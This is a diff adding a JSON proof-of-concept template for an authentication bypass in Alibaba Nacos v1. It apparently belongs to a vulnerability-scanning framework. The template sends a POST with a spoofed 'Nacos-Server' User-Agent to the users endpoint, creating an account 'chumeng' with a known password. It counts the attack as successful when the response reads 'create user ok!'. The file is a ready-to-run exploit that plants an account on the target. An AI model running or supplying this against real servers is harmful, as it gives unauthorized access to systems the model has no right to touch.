@@ -1,0 +1,32 @@
+{
+    "Name": "alibaba-nacos-v1-auth-bypass",
+    "Description": "alibaba-nacos-v1-auth-bypass",
+    "Product": "Alibaba",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "POST",
+        "Header": {"User-Agent": "Nacos-Server"},
+        "Uri":"/nacos/v1/auth/users?username=chumeng&password=chumeng",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "create user ok!"
+                },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
